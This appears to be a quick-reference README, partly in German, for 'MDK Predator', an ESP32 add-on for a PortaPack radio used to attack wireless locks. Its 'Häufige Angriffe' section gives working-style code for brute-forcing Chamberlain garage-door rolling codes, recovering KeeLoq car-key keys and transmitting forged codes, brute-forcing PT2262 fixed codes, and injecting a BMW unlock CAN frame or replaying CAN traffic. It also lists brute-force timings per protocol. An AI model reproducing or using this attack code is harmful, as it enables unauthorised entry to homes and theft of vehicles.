# MDK Predator - Quick Reference

Schnell-Referenz für die häufigsten Operationen.

## 🚀 Quick Start

### ESP32 Firmware Flashen (30 Sekunden)

```bash
# 1. ESP-IDF aktivieren
cd ~/esp-idf && . ./export.sh

# 2. Zum Projekt
cd ~/mdk-esp32

# 3. Bauen & Flashen
idf.py build flash monitor
```

### PortaPack I2C Test

```cpp
// In MDKPredatorApp::init()
if (mdk_ping()) {
    console.writeln("✅ ESP32 connected!");
} else {
    console.writeln("❌ ESP32 not found");
}
```

## 🔧 I2C Commands

### System Commands

```cpp
// Ping
mdk_ping()  // Returns true if ESP32 responds

// Get Version
mdk_version_t ver;
mdk_get_version(&ver);  // ver.major, ver.minor, ver.patch

// Get Status
mdk_module_status_t status;
mdk_get_status(&status);  // status.state, status.free_heap, etc.

// Abort Operation
mdk_abort();
```

### KeeLoq Operations

```cpp
// Start Bruteforce
mdk_keeloq_bruteforce_start(
    0x12345678,              // encrypted value
    0x00001234,              // known plaintext
    0x0000000000000000,      // start key
    0xFFFFFFFFFFFFFFFF       // end key
);

// Get Progress
mdk_progress_t progress;
mdk_get_progress(&progress);
// progress.current_key
// progress.total_keys
// progress.keys_per_second
// progress.estimated_time_ms

// Get Result
mdk_keeloq_result_t result;
mdk_keeloq_bruteforce_get_result(&result);
if (result.success) {
    printf("Found: 0x%016llX\n", result.found_key);
}
```

## 📊 Performance Numbers

### Bruteforce Geschwindigkeit (ESP32-S3 @ 240MHz)

| Protocol | Keyspace | Time (Full) | Time (Realistic) |
|----------|----------|-------------|------------------|
| HT6P20 | 2^20 | 2 sec | 2 sec |
| PT2260 | 3^12 | 10 sec | 10 sec |
| Chamberlain v1 | 2^8 | <1 sec | <1 sec |
| Ford SecuriCode | 10^5 | 100 sec | 100 sec |
| KeeLoq (limited) | 2^32 | 7 min | 7 min |
| KeeLoq (full) | 2^64 | 117M years | Never |

**Realistische Szenarien**:
- **Mit Known-Plaintext** (2^40): ~3 Stunden
- **Mit Manufacturer Seed** (2^32): ~7 Minuten
- **Mit Rainbow Table** (2^24): ~3 Sekunden

## 🎯 Häufige Angriffe

### 1. Garagentor (Chamberlain Security+ v1)

```cpp
// Capture Code
uint64_t captured = capture_rf_code(315000000);

// Decode
chamberlain_secplus_v1_context_t ctx;
chamberlain_secplus_v1_decode(captured, &ctx);

// Bruteforce Rolling Code (256 mögliche)
for (uint16_t roll = 0; roll < 256; roll++) {
    ctx.rolling_code = roll;
    uint64_t test_code;
    chamberlain_secplus_v1_encode(&ctx, &test_code);
    if (transmit_and_verify(test_code)) {
        printf("✅ Door opened with roll=%d\n", roll);
        break;
    }
}
```

### 2. Autoschlüssel (KeeLoq)

```cpp
// Capture encrypted code
uint32_t encrypted = 0x12345678;

// If you know counter value (e.g., from previous capture)
uint32_t known_counter = 0x1234;

// Bruteforce mit bekanntem Counter
mdk_keeloq_bruteforce_start(
    encrypted,
    known_counter,
    0x0000000000000000,
    0xFFFFFFFFFFFFFFFF
);

// Wait for result
while (true) {
    mdk_progress_t prog;
    mdk_get_progress(&prog);
    printf("Progress: %.2f%%\n", 
           (prog.current_key * 100.0) / prog.total_keys);
    
    if (prog.current_key >= prog.total_keys) break;
    vTaskDelay(1000);
}

// Get key
mdk_keeloq_result_t res;
mdk_keeloq_bruteforce_get_result(&res);
if (res.success) {
    printf("✅ Key found: 0x%016llX\n", res.found_key);
    
    // Now you can replay any code
    uint32_t new_code = keeloq_encrypt(0x5678, res.found_key);
    transmit_code(new_code, 433920000);
}
```

### 3. Fixed Code (PT2262)

```cpp
// Capture signal
uint16_t pulses[100];
size_t count;
capture_pulse_train(GPIO_NUM_4, pulses, 100, &count);

// Detect protocol
protocol_type_t proto = detect_protocol(pulses, count);

if (proto == PROTOCOL_PT2262) {
    // Bruteforce all 531,441 codes
    for (uint32_t code = 0; code < 531441; code++) {
        pt226x_context_t ctx = {
            .address = code,
            .data = 0,
            .address_bits = 12,
            .data_bits = 0
        };
        
        uint32_t encoded;
        pt226x_encode(&ctx, &encoded);
        
        if (transmit_and_verify(encoded)) {
            printf("✅ Success with code=%lu\n", code);
            break;
        }
    }
}
```

### 4. CAN Bus Injection (BMW Unlock)

```cpp
// Initialize CAN @ 500 kbps
can_init(500000, false);

// BMW FEM Unlock Frame
can_send_frame(0x2FC, (uint8_t[]){0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07}, 8);

// Or capture & replay
can_start_capture();
vTaskDelay(pdMS_TO_TICKS(10000));  // Capture for 10 sec
can_stop_capture();
can_replay_attack();
```

## 🔍 Debugging

### ESP32 Serial Monitor

```bash
idf.py monitor

# Filter specific tags
idf.py monitor | grep MDK_MAIN

# Show only errors
idf.py monitor | grep "E ("
```

### I2C Debugging (PortaPack)

```cpp
// Check I2C bus
i2c::scan();  // Should show 0x51

// Manual I2C test
uint8_t data[32];
i2c::read(0x51, data, 32);

// Send ping manually
uint8_t ping_cmd[] = {0x00, 0x00, 0x00, 0x04, 'P', 'I', 'N', 'G'};
i2c::write(0x51, ping_cmd, 8);
```

### Performance Monitoring

```cpp
// Get ESP32 stats
mdk_module_status_t status;
mdk_get_status(&status);

printf("CPU: %d.%02d%%\n", 
       status.cpu_usage / 100, 
       status.cpu_usage % 100);
printf("Heap: %lu bytes free\n", status.free_heap);
printf("Uptime: %lu ms\n", status.uptime_ms);
```

## 📝 Häufige Fehler & Lösungen

### "ESP32 not responding"

1. **Check I2C Wiring**:
   - SCL: GPIO9 → PortaPack SCL
   - SDA: GPIO8 → PortaPack SDA
   - GND: Common Ground

2. **Check Pullups**: 4.7kΩ auf SCL und SDA

3. **Check Power**: ESP32 braucht 3.3V, min. 500mA

### "Bruteforce too slow"

1. **Check CPU Frequency**:
   ```cpp
   // Should be 240 MHz
   CONFIG_ESP32S3_DEFAULT_CPU_FREQ_240=y
   ```

2. **Check Optimization**:
   ```cmake
   target_compile_options(... -O3 -ffast-math)
   ```

3. **Check Dual-Core**:
   ```cpp
   CONFIG_FREERTOS_UNICORE=n  // Must be n (not y)
   ```

### "size_t undefined"

Fix in `automotive_protocols.h`:
```c
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>  // ← ADD THIS LINE
```

## 🎓 Best Practices

### Bruteforce mit eingeschränktem Keyspace

```cpp
// Statt vollem 2^64 Keyspace:
// 1. Manufacturer Seed verwenden
uint64_t seed = 0x5309;  // Chrysler
uint64_t start = seed << 48;
uint64_t end = start + 0x0000FFFFFFFFFFFF;

// 2. Oder basierend auf Serial Number
uint32_t serial = 0x12345678;
start = (uint64_t)serial << 32;
end = start + 0xFFFFFFFF;

mdk_keeloq_bruteforce_start(encrypted, known_plain, start, end);
```

### Progress Updates effizient

```cpp
// Nicht jeden Key checken!
// Stattdessen: Timer-basiert
void progress_timer_callback() {
    mdk_progress_t prog;
    if (mdk_get_progress(&prog)) {
        update_display(prog);
    }
}

// Timer alle 500ms
timer_create(500, progress_timer_callback);
```

### Memory Management

```cpp
// Große Buffer auf Heap, nicht Stack
uint8_t* buffer = malloc(1024 * 1024);  // 1 MB
if (buffer) {
    // Use buffer
    free(buffer);
}

// Check available heap
printf("Free heap: %lu\n", esp_get_free_heap_size());
```

## 📚 Weitere Ressourcen

- **Vollständige Doku**: `MDK_PREDATOR_COMPLETE.md`
- **Integration Guide**: `ESP32_INTEGRATION_GUIDE.md`
- **TODO Status**: `TODO_STATUS.md`
- **I2C Protocol**: `mdk_i2c_protocol.h`

## 🆘 Support

Bei Problemen:
1. Check `TODO_STATUS.md` für bekannte Issues
2. Serial Monitor Output prüfen
3. I2C Verbindung testen
4. GitHub Issues erstellen

---

**Version**: 1.0.0  
**Letzte Aktualisierung**: 2. Nov 2024  
**Status**: Production Ready
